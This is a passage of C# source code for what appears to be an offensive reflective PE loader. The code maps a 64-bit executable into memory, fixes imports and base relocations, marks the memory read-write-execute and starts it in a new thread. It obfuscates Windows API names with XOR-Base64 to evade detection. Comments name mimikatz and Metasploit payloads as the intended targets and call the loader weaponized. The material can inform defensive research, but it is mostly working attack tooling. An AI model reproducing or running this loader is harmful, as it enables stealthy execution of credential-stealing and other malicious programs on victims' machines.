        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
        );

        #endregion CreateThread

        #region WaitForSingleObject
        //[DllImport("kernel32")]
        //public static extern UInt64 WaitForSingleObject(
        //IntPtr hHandle,
        //UInt64 dwMilliseconds
        //);

        // delegate
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
		public delegate UInt64 WFSO(
		IntPtr hHandle,
		UInt64 dwMilliseconds
		);
        #endregion WaitForSingleObject

        #endregion PInvoke for linked lists and WinAPI for PE parsing and Executing

        #region Encrypted Strings:

        public static string k = "AzU6Pi08e2I="; // Xor-Base64(Kernel32)
        public static string va = "Hjk6JD0xJBEkPCcz"; // Xor-Base64(VirtualAlloc)
        public static string ct = "CyItMTw1HDg6NSk0"; // Xor-Base64(CreateThread)
        public static string vp = "Hjk6JD0xJAA6Pzw1KyQ="; // Xor-Base64(VirtualProtect)
        public static string wf = "HzEhJA4/OgMhPi88LR8qOi0zPA=="; // Xor-Base64(WaitForSingleObject)
        public static string gle = "DzU8HCkjPBU6Iici"; // Xor-Base64(GetLastError)

        #endregion Encrypted Strings:

        #region Delegates:

        // VirtualAlloc
        public static IntPtr funcaddr = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(va)));
        public static valloc VA = (valloc)Marshal.GetDelegateForFunctionPointer(funcaddr, typeof(valloc));

        // CreateThread
        public static IntPtr funcaddr2 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(ct)));
        public static CRThread crthread = (CRThread)Marshal.GetDelegateForFunctionPointer(funcaddr2, typeof(CRThread));

        // VirtualProtect
        public static IntPtr funcaddr3 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(vp)));
        public static VP Vp = (VP)Marshal.GetDelegateForFunctionPointer(funcaddr3, typeof(VP));

        // WaitForSingleObject
        public static IntPtr funcaddr4 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(wf)));
        public static WFSO wfso = (WFSO)Marshal.GetDelegateForFunctionPointer(funcaddr4, typeof(WFSO));

        // GetLastError
        public static IntPtr funcaddr5 = GetProcAddress(LoadLibrary(Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(k))), Encoding.UTF8.GetString(reveng_loader.Program.XOR_B64_Decrypt(gle)));
        public static GLE Gle = (GLE)Marshal.GetDelegateForFunctionPointer(funcaddr5, typeof(GLE));

        #endregion Delegates:

        public static Int32 GetPEImageSize(byte[] rawfile)
        {
            Int32 PEimagesize = 0;

            // Storing the Offset of the PE Header/NT Header of the passed PE executable,
            // i.e. stores a pointer which points to PE/NT Header
            byte[] lfanew = new byte[4];

            for (int i = 0; i < lfanew.Length; i++)
            {
                /* 
				Length of DOS Header = 64 bytes (0-63)
				Last member of DOS Header => DWORD e_lfanew => 4 bytes

				i.e. From 60 to 63
				*/

                lfanew[i] = rawfile[i + 60];

                // Printing the offset in hex format (little endian)
                //Console.Write(lfanew[i]);
            }

            // Storing the offset in integer format
            Int32 elfanew = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(elfanew.ToString("X"));
            // Now we are at the starting of the PE/NT Header

            /* Let's jump to Optional Header to size of Image : */

            // But, first let's jump to Optional Header:
            // e_lfanew + size of signature(4 bytes) + size of File Header(20 bytes) = Start of Optional Header
            // e_lfanew + 24 bytes = Start of Optional Header

            // To get the Size of PE Image (.exe files are image files):
            // e_lfanew
            // + 24 bytes
            // + IMAGE_OPTIONAL_HEADER64.SizeOfImage (uint=32bits=4bytes) (offset = 56)

            elfanew += 24 + 56;

            byte[] sizeofimage = new byte[4];

            for (Int32 i = 0; i < sizeofimage.Length; i++)
            {
                sizeofimage[i] = rawfile[elfanew + i];
            }

            // Storing the retrieved PE Image size in integer format:
            PEimagesize = BitConverter.ToInt32(sizeofimage, 0);
            return PEimagesize;
        }

        public static Int32 GetPEHeaderSize(byte[] rawfile)
        {
            Int32 PEheaderSize = 0;

            // Same Procedure like before in GetPEImageSize()

            // Storing the Offset of the PE Header/NT Header of the passed PE executable,
            // i.e. stores a pointer which points to PE/NT Header
            byte[] lfanew = new byte[4];

            for (int i = 0; i < lfanew.Length; i++)
            {
                /* 
				Length of DOS Header = 64 bytes (0-63)
				Last member of DOS Header => DWORD e_lfanew => 4 bytes

				i.e. From 60 to 63
				*/

                lfanew[i] = rawfile[i + 60];

                // Printing the offset in hex format (little endian)
                //Console.Write(lfanew[i]);
            }

            // Storing the offset in integer format
            Int32 elfanew = BitConverter.ToInt32(lfanew, 0);

            //Console.WriteLine(elfanew.ToString("X"));
            // Now we are at the starting of the PE/NT Header

            /* Let's jump to Optional Header to size of Image : */

            // But, first let's jump to Optional Header:
            // e_lfanew + size of signature(4 bytes) + size of File Header(20 bytes) = Start of Optional Header
            // e_lfanew + 24 bytes = Start of Optional Header

            // To get the Size of PE Header :
            // e_lfanew
            // + 24 bytes
            // + [IMAGE_OPTIONAL_HEADER64.SizeOfHeaders (uint=32bits=4bytes) (offset = 60)]

            elfanew += 24 + 60;

            byte[] sizeofheader = new byte[4];

            for (Int32 i = 0; i < sizeofheader.Length; i++)
            {
                sizeofheader[i] = rawfile[elfanew + i];
            }

            // Storing the retrieved PE Header size in integer format:
            PEheaderSize = BitConverter.ToInt32(sizeofheader, 0);
            return PEheaderSize;
        }

        // Checking: Whether PE is PE32+ executable
        public static void Check_File(byte[] rawfile)
        {
            // Storing the Offset of the PE Header/NT Header of the passed PE executable,
            // i.e. stores a pointer which points to PE/NT Header
            byte[] lfanew = new byte[4];

            for (int i = 0; i < lfanew.Length; i++)
            {
                /* 
				Length of DOS Header = 64 bytes (0-63)
				Last member of DOS Header => DWORD e_lfanew => 4 bytes

				i.e. From 60 to 63
				*/
                lfanew[i] = rawfile[i + 60];

                // Printing the offset in hex format (little endian)
                //Console.Write(lfanew[i]);
            }

            // Storing the offset in integer format
            Int32 elfanew = BitConverter.ToInt32(lfanew, 0);
            //Console.WriteLine(elfanew.ToString("X"));
            // Now we are at the starting of the PE/NT Header

            /* Let's jump to Optional Header to size of Image : */

            // But, first let's jump to Optional Header:
            // e_lfanew + size of signature(4 bytes) + size of File Header(20 bytes) = Start of Optional Header
            // e_lfanew + 24 bytes = Start of Optional Header

            elfanew += 24;

            // link: https://raw.githubusercontent.com/corkami/pics/master/binary/pe101/pe101-64.png
            // 1st element of Optional Header: Magic
            byte[] magic = new byte[2];

            for (Int32 i = 0; i < magic.Length; i++)
            {
                magic[i] = rawfile[elfanew + i];
            }

            //Console.WriteLine("[+] Signature: {0}", Encoding.ASCII.GetString(magic));

            // Checking the architecture of the executable 
            if (BitConverter.ToString(magic, 0).Equals("0B-02"))
            {
                Console.WriteLine("[+] PE type: PE32+ executable\n");
            }
            else
            {
                Console.WriteLine("[-] PE type: Nope! \t => Only PE32+ executable allowed!");
                Environment.Exit(0);
            }
        }

        public static void LoadPE(byte[] rawfile, string filepath)
        {
            //string filepath = "C:\\Users\\HP\\Desktop\\Tools\\mimikatz.exe";

            //byte[] rawfile = File.ReadAllBytes(filepath);

            Console.WriteLine("\n[+] Loaded {0} into memory", filepath);

            // C:\\Windows\\System32\\notepad.exe
            // C:\\Users\\HP\\Desktop\\Tools\\msf_calc_noexit_thread.exe
            // C:\\Users\\HP\\Desktop\\Tools\\msf_calc.exe
            // C:\\Users\\HP\\Desktop\\Tools\\mimikatz.exe

            #region Check Machine Arch. of Executable file

            Check_File(rawfile);

            #endregion Check Machine Arch. of Executable file

            #region Start: Size of PE Image and Header

            //Size of PE Image:
            Int32 PEimagesize = GetPEImageSize(rawfile);
            Console.WriteLine("[+] Size of PE Image (hex): {0}", PEimagesize.ToString("X"));

            //Size of PE Header:
            Int32 PEheadersize = GetPEHeaderSize(rawfile);
            Console.WriteLine("[+] Size of PE Header (hex): {0}", PEheadersize.ToString("X"));

            #endregion End: Size of PE Image and Header

            #region Start: Only Parsing PE Headers

            // MEM_COMMIT: 0x00001000
            // PAGE_EXECUTE_READWRITE: 0x40
            //IntPtr baseaddr = VirtualAlloc(IntPtr.Zero,
            //    PEheadersize,
            //    0x00001000,
            //     0x40);

            #endregion End: Only Parsing PE Headers

            #region Start: Parsing full PE

            // MEM_COMMIT: 0x00001000
            // RWX: 0x40
            // RW: 0x04
            //IntPtr baseaddr = VirtualAlloc(IntPtr.Zero,
            //    PEimagesize,
            //    0x00001000,
            //     0x04);

            // delegate
            IntPtr baseaddr = VA(IntPtr.Zero, (uint)PEimagesize, 0x00001000, 0x04);

            //IntPtr ptr = IntPtr.Zero;

            //UIntPtr imgsize = (UIntPtr)PEimagesize;

            //Console.WriteLine("1272");

            //uint allocationType = (uint)0x00001000;
            //uint protection = (uint)0x04;

            ////direct syscall
            //NTSTATUS baseaddr = syscall_NtAllocateVirtualMemory(
            //    GetCurrentProcess(), 
            //    ref ptr,
            //    IntPtr.Zero,
            //    imgsize, 
            //    allocationType, 
            //    protection);


            //Console.WriteLine("1284");


            if (baseaddr == IntPtr.Zero)
            //if ((IntPtr)baseaddr == IntPtr.Zero)
            {
                // Gle(): delegate
                Console.WriteLine("[-] Address of allocated memory is NULL: \n{0}", Gle());
                Environment.Exit(0);
            }

             Marshal.Copy(rawfile, 0, baseaddr, PEheadersize);
            //Marshal.Copy(rawfile, 0, (IntPtr)baseaddr, PEheadersize);

            #endregion End: Parsing full PE

            #region Start: DOS_HEADER

            IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)(Marshal.PtrToStructure(baseaddr, typeof(IMAGE_DOS_HEADER)));
            //IMAGE_DOS_HEADER dosheader = (IMAGE_DOS_HEADER)(Marshal.PtrToStructure((IntPtr)baseaddr, typeof(IMAGE_DOS_HEADER)));

            //Console.WriteLine("\n[+] DOS_HEADER:");
            //Console.WriteLine("\t 1st Member: e_magic = {0}", new string(dosheader.e_magic));
            //Console.WriteLine("\t last Member: e_lfanew = {0}", (dosheader.e_lfanew).ToString("X"));

            #endregion End: DOS_HEADER

            #region Start: NT_HEADERS64

            IMAGE_NT_HEADERS64 ntheader = (IMAGE_NT_HEADERS64)(Marshal.PtrToStructure(baseaddr + dosheader.e_lfanew, typeof(IMAGE_NT_HEADERS64)));
            //IMAGE_NT_HEADERS64 ntheader = (IMAGE_NT_HEADERS64)(Marshal.PtrToStructure((IntPtr)baseaddr + dosheader.e_lfanew, typeof(IMAGE_NT_HEADERS64)));

            //Console.WriteLine("[+] NT_HEADER:");
            //Console.WriteLine("\t 1st Member: Signature = {0} (LSB)", (ntheader.Signature).ToString("X"));
            //Console.WriteLine("\t 2nd Member: FileHeader =>");
            //Console.WriteLine("\t\t 1st Member: Machine = {0}", (ntheader.FileHeader.Machine).ToString("X"));
            //Console.WriteLine("\t\t 2nd Member: NumberOfSections = {0}", ntheader.FileHeader.NumberOfSections);
            //Console.WriteLine("\t\t 6th Member: SizeOfOptionalHeader = {0}", ntheader.FileHeader.SizeOfOptionalHeader);

            #endregion End: NT_HEADERS64

            #region Start: Mapping Sections into Memory

            IMAGE_SECTION_HEADER[] sectionheader = new IMAGE_SECTION_HEADER[ntheader.FileHeader.NumberOfSections];

            Console.WriteLine("\n[*] Mapping Sections into Memory...");

            Console.WriteLine("\n[+] SECTION_HEADER:");
            Console.WriteLine("\t 2nd Member: Name =>");
            for (int i = 0; i < ntheader.FileHeader.NumberOfSections; i++)
            {
                //IntPtr sectionalloc = virtualalloc(
                //    (baseaddr + (int)sectionheader[i].virtualaddress),
                //    (int)sectionheader[i].sizeofrawdata,
                //    0x00001000,
                //    0x04);

                sectionheader[i] = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure
                    (((IntPtr)baseaddr + dosheader.e_lfanew + 24 + Marshal.SizeOf(ntheader.OptionalHeader))
                    + (i * Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER))),
                    typeof(IMAGE_SECTION_HEADER));

                // delegate
                IntPtr SectionAlloc = VA(
                    (baseaddr + (int)sectionheader[i].VirtualAddress),
                    (uint)sectionheader[i].SizeOfRawData,
                    0x00001000,
                    0x04);

                //IntPtr SectionAlloc = VA(
                //    ((IntPtr)baseaddr + (int)sectionheader[i].VirtualAddress),
                //    (uint)sectionheader[i].SizeOfRawData,
                //    0x00001000,
                //    0x04);

                if (SectionAlloc == IntPtr.Zero)
                {
                    // Gle(): delegate
                    Console.WriteLine("[-] Address of allocated memory is NULL: \n{0}", Gle());
                    Environment.Exit(0);
                }

                Console.Write("\t\t {0}", new string(sectionheader[i].Name));
                
                Console.Write(": 0x{0}", (baseaddr + (int)(sectionheader[i].PointerToRawData)).ToString("X4"));
                //Console.Write(": 0x{0}", ((IntPtr)baseaddr + (int)(sectionheader[i].PointerToRawData)).ToString("X4"));

                Console.WriteLine(" (Offset: 0x{0})", (sectionheader[i].PointerToRawData).ToString("X4"));

                Marshal.Copy(rawfile, (int)sectionheader[i].PointerToRawData, SectionAlloc, (int)sectionheader[i].SizeOfRawData);
            }

            #endregion End: Mapping Sections into Memory

            #region Comparison: Actual vs normal: Need Base Relocation
            /* link: https://raw.githubusercontent.com/corkami/pics/master/binary/pe101/pe101-64.png
             * 
             * Address where the file Should be mapped in memory
             */
            Console.WriteLine("\n[>] Preferred Base Address of PE: 0x{0} (using: IMAGE_NT_HEADERS64->OptionalHeader.ImageBase)", ntheader.OptionalHeader.ImageBase.ToString("X"));
            Console.WriteLine("[!] But, BaseAddress of the loaded PE: 0x{0}\n", baseaddr.ToString("X4"));

            Console.WriteLine("[*] Performing BaseAddress Relocation to Solve the Problem...");

            #endregion Comparison: Actual vs normal: Need Base Relocation

            #region Calculating Delta value to perform BaseAddress Relocation

            long Delta;
            // Delta = Current Base Address - Preferred Base Address
            Delta = (long)((long)baseaddr.ToInt64() - (long)ntheader.OptionalHeader.ImageBase);

            //IntPtr baddr = (IntPtr)baseaddr;
            //Delta = (long)((long)baddr.ToInt64() - (long)ntheader.OptionalHeader.ImageBase);

            Console.WriteLine("[>] Delta Value: 0x{0}\n", Delta.ToString("X4"));

            #endregion Calculating Delta value to perform BaseAddress Relocation

            #region Start: Fixing IAT

            Console.WriteLine("[*] Fixing Imports...");

            /* 
             * (When the OS loader loads the executable in the memory, 
             * it overwrites each IAT entry with the actual address of the imported function, 
             * and thats what we are doing.)
             */

            #region demo: IMAGE_OPTIONAL_HEADER64 and IMAGE_DATA_DIRECTORY structure
            /*
             * public struct IMAGE_OPTIONAL_HEADER64
             *  {
             *     ...
             *     ...
             *      [FieldOffset(120)]
             *      public IMAGE_DATA_DIRECTORY ImportTable;
             *      ...
             *      ...
             *  }
             *  
             *  public struct IMAGE_DATA_DIRECTORY
             *  {
             *      public UInt32 VirtualAddress;      // RVA of data in import directory
             *      public UInt32 Size;                // Size of the data (in bytes) in import directory
             *  }
             */
            #endregion demo: IMAGE_OPTIONAL_HEADER64 and IMAGE_DATA_DIRECTORY structure

            // Fixing IAT's only if import directory is more than zero => if present
            if (ntheader.OptionalHeader.ImportTable.Size > 0)
            {
                // Storing the location of the 1st/starting Import Directory of dll
                IntPtr firstimportptr = baseaddr + (int)ntheader.OptionalHeader.ImportTable.VirtualAddress;
                //IntPtr firstimportptr = (IntPtr)baseaddr + (int)ntheader.OptionalHeader.ImportTable.VirtualAddress;

                // link: https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/
                // link: https://0xrick.github.io/win-internals/pe6/
                #region demo: IMAGE_IMPORT_DESCRIPTOR structure
                /*
                 * public struct IMAGE_IMPORT_DESCRIPTOR
                 *  {
                 *      [FieldOffset(0)]
                 *      public uint Characteristics;

                 *      [FieldOffset(0)]
                 *      public uint OriginalFirstThunk;     // Holds RVA of ILT/INT (Import Lookup Table or, Import Name Table) of the imported DLL

                 *      [FieldOffset(4)]
                 *      public uint TimeDateStamp;

                 *      [FieldOffset(8)]
                 *      public uint ForwarderChain;

                 *      [FieldOffset(12)]
                 *      public uint Name;               // RVA of imported DLL name

                 *      [FieldOffset(16)]
                 *      public uint FirstThunk;         // RVA of IAT (Import Address Table)
                 *  }
                 */
                #endregion demo: IMAGE_IMPORT_DESCRIPTOR structure

                /* link: https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/
                 * 
                 * INT is another array that is identical to the IAT and is also an array of IMAGE_THUNK_DATA structures.
                 * As both point to the same data structure, the main difference between the IAT and INT is that 
                 * INT isn’t overwritten by the Windows loader when the executable is loaded into the memory 
                 * but IAT entries get overwritten with the actual address of the imported function.
                 * 
                 * Also, INT is not required for an executable to load 
                 * but IAT is one of the essential components for an executable to load. 
                 * Without this, it may fail to load.
                 * 
                 * On-disk both OriginalFirstThunk (INT) points to the same data structures i.e. IMAGE_THUNK_DATA, just like 
                 * that of the FirstThunk (IAT).
                 * But in memory, IAT flips around and points out to the other DLLs.
                 * 
                 * see 1: https://cdn-fjdcd.nitrocdn.com/LpchKGwvYiMgtSfnJQJjgrwyNwbJLiRO/assets/static/optimized/rev-de92639/storage/2019/08/Imports_on_Disk.png
                 * see 2: https://cdn-fjdcd.nitrocdn.com/LpchKGwvYiMgtSfnJQJjgrwyNwbJLiRO/assets/static/optimized/rev-de92639/storage/2019/08/Imports_in_Memory.png
                 */

                IMAGE_IMPORT_DESCRIPTOR firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(firstimportptr, typeof(IMAGE_IMPORT_DESCRIPTOR));

                // For printing all available dll names, dll addresses
                Console.WriteLine("\n[+] Loaded DLLs: \n");

                while (firstimport.Name != 0)
                {
                    // Retrieving RVA of IAT (Import Address Table)
                    IntPtr firstthunkptr = baseaddr + (int)firstimport.FirstThunk;
                    //IntPtr firstthunkptr = (IntPtr)baseaddr + (int)firstimport.FirstThunk;

                    //Console.WriteLine("\nFirst thunk: {0} (offset: {1})", firstthunkptr.ToString("X"), firstimport.FirstThunk.ToString("X"));

                    // Retrieving RVA of imported DLL name
                    // Ansi: because it will read upto null byte to retrieve the dll name (string)
                    
                    string dllname = Marshal.PtrToStringAnsi(baseaddr + (int)firstimport.Name);
                    //string dllname = Marshal.PtrToStringAnsi((IntPtr)baseaddr + (int)firstimport.Name);

                    Console.Write("{0}, ", dllname);

                    // Loading dll into memory in order to fix IAT
                    IntPtr dllhandle = LoadLibrary(dllname);

                    //delegate

                    if (dllhandle == IntPtr.Zero)
                    {
                        Console.WriteLine("[-] Failed to get any Handle to {0}", dllname);
                        Environment.Exit(0);
                    }

                    // Storing the RVA of ILT/INT (Import Lookup Table or, Import Name Table)
                    IntPtr firstoriginalthunkptr = baseaddr + (int)firstimport.OriginalFirstThunk;
                    //IntPtr firstoriginalthunkptr = (IntPtr)baseaddr + (int)firstimport.OriginalFirstThunk;

                    //Console.WriteLine("First Original thunk: {0} (offset: {1})\n", firstoriginalthunkptr.ToString("X"), firstimport.OriginalFirstThunk.ToString("X"));

                    #region demo: IMAGE_THUNK_DATA64 structure
                    /*
                     * public struct IMAGE_THUNK_DATA64
                     *  {
                     *      [FieldOffset(0)]
                     *      public ulong ForwarderString;

                     *      [FieldOffset(0)]
                     *      public ulong Function;

                     *      [FieldOffset(0)]
                     *      public ulong Ordinal;

                     *      [FieldOffset(0)]
                     *      public ulong AddressOfData;
                     *      
                     *  }
                     *  
                     *  // cpp version:
                     *  
                     *      typedef struct _IMAGE_THUNK_DATA
                     *      {
                     *          union
                     *          {
                     *              ...
                     *              PDWORD Function;
                     *              DWORD Ordinal;
                     *              PIMAGE_IMPORT_BY_NAME AddressOfData;
                     *          }u1;
                     *      }IMAGE_THUNK_DATA32;
                     * 
                     */
                    #endregion demo: IMAGE_THUNK_DATA64 structure

                    /* link: https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/
                     * The IMAGE_THUNK_DATA structure is an array of DWORDs and each DWORD represent 
                     * an imported function and is defined in the WinNT.H header file.
                     */

                    // To retrieve imported function names from each dll loading
                    IMAGE_THUNK_DATA64 firstoriginalthunk = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(firstoriginalthunkptr, typeof(IMAGE_THUNK_DATA64));

                    /*
                     * The IMAGE_THUNK_DATA structures within the IAT serve two purposes.
                     * 
                     * In the executable file, they contain:
                     * 
                     * 1. Either the ordinal of the imported API 
                     * 2. or an RVA to an IMAGE_IMPORT_BY_NAME structure.
                     * 
                     * The IMAGE_IMPORT_BY_NAME structure is just a WORD, followed by a string naming the imported API.
                     */

                    // For printing imported function names and their corresponding addresses from each dll loading
                    while (firstoriginalthunk.Function != 0)
                    {
                        // Storing the address of:
                        // firstoriginalthunk.Function,
                        // firstoriginalthunk.Ordinal
                        // and firstoriginalthunk.AddressOfData

                        // As Union Structure is used: all of them lies in the same memory location.

                        // All are Same:
                        //IntPtr nameptr = baseaddr + (int)firstoriginalthunk.Function;
                        //IntPtr nameptr = baseaddr + (int)firstoriginalthunk.Ordinal;
                        IntPtr nameptr = baseaddr + (int)firstoriginalthunk.AddressOfData;
                        //IntPtr nameptr = (IntPtr)baseaddr + (int)firstoriginalthunk.AddressOfData;

                        #region demo: IMAGE_IMPORT_BY_NAME structure
                        /*
                         * public struct IMAGE_IMPORT_BY_NAME
                         *  {
                         *      public UInt16 Hint;
                         *      public char Name;
                         *  } 
                         *  
                         *  // cpp version:
                         *  typedef struct _IMAGE_IMPORT_BY_NAME {
                         *      WORD    Hint;
                         *      BYTE    Name[1];
                         *  } IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;
                         */
                        #endregion demo: IMAGE_IMPORT_BY_NAME structure

                        string functionname = Marshal.PtrToStringAnsi(nameptr + 2);
                        //Console.Write("\t API Name: {0}", functionname);

                        IntPtr functionaddr = GetProcAddress(dllhandle, functionname);

                        // Unable to get the Offset of API address: (just to compare it with PE Bear)
                        //Console.WriteLine("\t API address (offset): {0}", ((int)baseaddr - (int)functionaddr).ToString("X4"));
                        //Console.WriteLine("\t API address: 0x{0}", functionaddr.ToString("X4"));

                        // Copying Function Address into the IAT Table
                        // as OS Loader (when the executable is loaded into the memory)
                        // overwrites IAT entries with the actual address of the imported function.

                        // As, PE Loader is basically a weaponized version of OS Loader.
                        // => functionality(PE Loader) == functionality(OS Loader)

                        byte[] funcbyte = BitConverter.GetBytes(functionaddr.ToInt64());
                        Marshal.Copy(funcbyte, 0, firstthunkptr, funcbyte.Length);

                        //Marshal.WriteInt64(firstoriginalthunkptr, functionaddr.ToInt64());

                        // Each dll name takes 8 byte of memory space as this is a 64-bit executable,
                        // so the entry is 64 bits long. (Took reference while parsing binary in PE Bear)
                        // (0->7) then (8->F) then repeat again...
                        firstthunkptr += 8;
                        firstoriginalthunkptr += Marshal.SizeOf(typeof(IMAGE_THUNK_DATA64));
                        firstoriginalthunk = (IMAGE_THUNK_DATA64)Marshal.PtrToStructure(firstoriginalthunkptr, typeof(IMAGE_THUNK_DATA64));
                    }

                    // Updating 1st import to next import/ dll
                    firstimportptr += Marshal.SizeOf(typeof(IMAGE_IMPORT_DESCRIPTOR));
                    firstimport = (IMAGE_IMPORT_DESCRIPTOR)Marshal.PtrToStructure(firstimportptr, typeof(IMAGE_IMPORT_DESCRIPTOR));
                }
            }

            #endregion End: Fixing IAT

            #region Start: Fixing Base Relocation

            Console.WriteLine("\n\n[*] Fixing Base Relocation...");

            #region demo: IMAGE_OPTIONAL_HEADER64 structure
            /*
             * public struct IMAGE_OPTIONAL_HEADER64
             * {
             *       ...
             *      [FieldOffset(24)]
             *      public ulong ImageBase;
             *      ...
             *      [FieldOffset(152)]
             *      public IMAGE_DATA_DIRECTORY BaseRelocationTable;
             *     ...
             *  }
             */
            #endregion demo: IMAGE_OPTIONAL_HEADER64 structure

            #region demo: IMAGE_DATA_DIRECTORY structure
            /*
             * public struct IMAGE_DATA_DIRECTORY
             * {
             *  public UInt32 VirtualAddress;
             *  public UInt32 Size;
             * }
             */
            #endregion demo: IMAGE_DATA_DIRECTORY structure

            #region demo: IMAGE_BASE_RELOCATION structure
            /*
                [StructLayout(LayoutKind.Explicit)]
                public struct IMAGE_BASE_RELOCATION
                {
                    [FieldOffset(0)]
                    public UInt32 pagerva;

                    [FieldOffset(4)]
                    public UInt32 size;
                }
             */
            #endregion demo: IMAGE_BASE_RELOCATION structure

            //IntPtr relocationTableptr = (IntPtr.Add(baseaddr, (int)ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress));
            //IntPtr relocationTableptr = baseaddr + (int)ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress;

            IntPtr relocationTableptr = (IntPtr)baseaddr + (int)ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress;

            //Console.WriteLine("[>] Using: IMAGE_NT_HEADERS64->OptionalHeader.BaseRelocationTable.VirtualAddress");
            Console.WriteLine("\n[+] Address of IMAGE_BASE_RELOCATION Table: 0x{0} (Offset: 0x{1})\n", relocationTableptr.ToString("X4"), ntheader.OptionalHeader.BaseRelocationTable.VirtualAddress.ToString("X4"));

            IMAGE_BASE_RELOCATION relocationTable = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTableptr, typeof(IMAGE_BASE_RELOCATION));

            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = relocationTableptr;
            int sizeofNextBlock = (int)relocationTable.size;

            IntPtr offset = relocationTableptr;

            while (relocationTable.pagerva != 0)
            {
                //Console.WriteLine("RVA: 0x{0}", relocationTable.pagerva.ToString("X4"));
                //Console.WriteLine("Size: 0x{0}", relocationTable.size.ToString("X4"));

                IntPtr updatedrelocationTableptr = IntPtr.Add(relocationTableptr, sizeofNextBlock);
                IMAGE_BASE_RELOCATION relocationTableNext = (IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(updatedrelocationTableptr, typeof(IMAGE_BASE_RELOCATION));

                //IntPtr dest = baseaddr + (int)relocationTable.pagerva;

                IntPtr dest = (IntPtr)baseaddr + (int)relocationTable.pagerva;

                //Console.WriteLine("Section Has {0} Entires", (int)(relocationTable.size - imageSizeOfBaseRelocation) / 2);
                //Console.WriteLine("Next Section Has {0} Entires", (int)(relocationTableNext.size - imageSizeOfBaseRelocation) / 2);

                for (int i = 0; i < (int)((relocationTable.size - imageSizeOfBaseRelocation) / 2); i++)
                {
                    IntPtr patchAddr;
                    UInt16 value = (UInt16)Marshal.ReadInt16(offset, 8 + (2 * i));

                    UInt16 type = (UInt16)(value >> 12);
                    UInt16 fixup = (UInt16)(value & 0xfff);
                    //Console.WriteLine("0x{0}, 0x{1}, 0x{2}", value.ToString("X4"), type.ToString("X4"), fixup.ToString("X4"));

                    switch (type)
                    {
                        case 0x0:
                            break;

                        case 0xA:
                            patchAddr = IntPtr.Add(dest, fixup);
                            //Add Delta To Location.
                            long originalAddr = Marshal.ReadInt64(patchAddr);
                            Marshal.WriteInt64(patchAddr, originalAddr + Delta);
                            break;
                    }
                }

                offset = IntPtr.Add(relocationTableptr, sizeofNextBlock);
                sizeofNextBlock += (int)relocationTableNext.size;
                relocationTable = relocationTableNext;

                nextEntry = IntPtr.Add(nextEntry, sizeofNextBlock);

                if (relocationTableNext.size == 0)
                {
                    break;
                }
            }

            #endregion End: Fixing Base Relocation Table

            #region Start: KickOff

            Console.WriteLine("[*] Executing in-memory loaded '{0}' PE from EntryPoint: 0x{1}", filepath, (baseaddr + (int)ntheader.OptionalHeader.AddressOfEntryPoint).ToString("X4"));
            //Console.WriteLine("[*] Executing in-memory loaded '{0}' PE from EntryPoint: 0x{1}", filepath, ((IntPtr)baseaddr + (int)ntheader.OptionalHeader.AddressOfEntryPoint).ToString("X4"));

            //IntPtr hThread = IntPtr.Zero;
            //IntPtr Threadstart = IntPtr.Add(baseaddr + (int)ntheader.OptionalHeader.AddressOfEntryPoint);

            //IntPtr varai = IntPtr.Add(baseaddr, (int)ntheader.OptionalHeader.AddressOfEntryPoint);

            //0x20: RX
            //0x40: RWX
            // _: Discard
            //bool check = VirtualProtect(baseaddr, (UIntPtr)PEimagesize, 0x40, out _);

            // delegate
            //bool check = Vp(baseaddr, (UIntPtr)PEimagesize, 0x40, out _);

            bool check = Vp((IntPtr)baseaddr, (UIntPtr)PEimagesize, 0x40, out _);

            if (check == true)
            {
                Console.WriteLine("[+] Permission of the memory region is set to -> RWX");
            }
            else
            {
                Console.WriteLine("[-] Oops! Permission of the memory region isn't RWX");
                Environment.Exit(1);
            }


            //IntPtr hThread = CreateThread(IntPtr.Zero,
            //    0,
            //    baseaddr + (int)ntheader.OptionalHeader.AddressOfEntryPoint,
            //    IntPtr.Zero,
            //    0,
            //    IntPtr.Zero);

            // delegate
            //IntPtr hThread = crthread(IntPtr.Zero, 
            //    0,
            //    baseaddr + (int)ntheader.OptionalHeader.AddressOfEntryPoint, 
            //    IntPtr.Zero, 
            //    0, 
            //    IntPtr.Zero);

            IntPtr hThread = crthread(IntPtr.Zero,
                0,
                (IntPtr)baseaddr + (int)ntheader.OptionalHeader.AddressOfEntryPoint,
                IntPtr.Zero,
                0,
                IntPtr.Zero);

            //WaitForSingleObject(hThread, 0xFFFFFFFF);
            // delegate
            wfso(hThread, 0xFFFFFFFF);


            /*
             * public delegate bool EnumThreadDelegate(IntPtr hWnd, IntPtr lParam);
             * 
